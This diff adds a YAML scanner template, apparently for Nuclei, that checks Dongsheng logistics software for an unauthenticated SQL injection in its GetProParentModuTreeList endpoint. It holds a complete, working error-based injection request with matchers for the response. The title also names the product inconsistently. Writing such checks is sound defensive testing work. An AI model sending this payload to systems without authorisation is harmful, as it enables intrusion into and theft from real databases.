@@ -1,0 +1,29 @@
+id: dongshengwuliu-getproparentmodutreelist-sqli
+
+info:
+  name: 东方物流 GetProParentModuTreeList SQL注入漏洞
+  author: qwtd
+  severity: high
+  description: |
+    东胜物流软件GetProParentModuTreeList存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用SQL注入漏洞获取数据库中的信息。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6/%E4%B8%9C%E8%83%9C%E7%89%A9%E6%B5%81%E8%BD%AF%E4%BB%B6GetProParentModuTreeList%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: 东胜物流软件
+
+http:
+  - raw:
+      - |
+        GET /MvcShipping/MsBaseInfo/GetProParentModuTreeList?PARENTID=%27+AND+4757+IN+%28SELECT+%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28122%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28SELECT+%28CASE+WHEN+%284757%3D4757%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28106%29%2BCHAR%28113%29%29%29+AND+%27KJaG%27%3D%27KJaG HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "qbzxq1qqbjq"
+          - "totalCount"
+        condition: and
+        
+      - type: status
+        status:
+          - 200
